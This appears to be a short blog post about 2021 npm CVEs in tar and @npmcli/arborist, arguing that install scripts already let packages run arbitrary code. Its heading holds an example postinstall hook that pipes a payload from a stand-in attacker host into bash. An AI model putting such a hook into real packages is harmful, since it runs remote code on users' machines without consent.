---
layout: post
title: Arbitrary code execution as a feature
date: 2021-09-08T17:44:24.153Z
---
Today, GitHub published [a write-up on a number of CVEs](https://github.blog/2021-09-08-github-security-update-vulnerabilities-tar-npmcli-arborist/)[^1] in the npm packages `tar` and `@npmcli/arborist`. In their own words, 

> The npm CLI aims to enforce certain security boundaries on package installation. One of these boundaries is that a package’s contents will only be written to the appropriate folder within the `node_modules` directory hierarchy. Several of the `tar` and `@npmcli/arborist` vulnerabilities will cross that security boundary and may result in unexpected arbitrary file overwrites and subsequent code execution when installing untrusted packages.

This sounds pretty scary: "arbitrary file overwrites and subsequent code execution" is the kind of phrase that you don't want to see in a CVE description. The problem is that by default, npm allows this to happen anyway.

# postinstall: "curl evil.com/payload | bash"

npm (and yarn) will already execute arbitrary code when you install a package via [install scripts](https://docs.npmjs.com/cli/v7/using-npm/scripts#npm-install). One valid use-case is to build native code on installation, or do some other environment-specific setup, though these scripts have also been used to [show ads](https://www.zdnet.com/article/npm-bans-terminal-ads/) and, of course, as an [attack](https://blog.sonatype.com/bladabindi-njrat-rat-in-jdb.js-npm-malware) [vector](https://snyk.io/blog/npm-security-malicious-code-in-oss-npm-packages/).



I don't mean to call out npm specifically: other package managers like pip have similar features.

[^1]: Specifically, CVE-2021-32803, CVE-2021-32804, CVE-2021-37701, CVE-2021-37712, CVE-2021-37713, CVE-2021-39134, and CVE-2021-39135.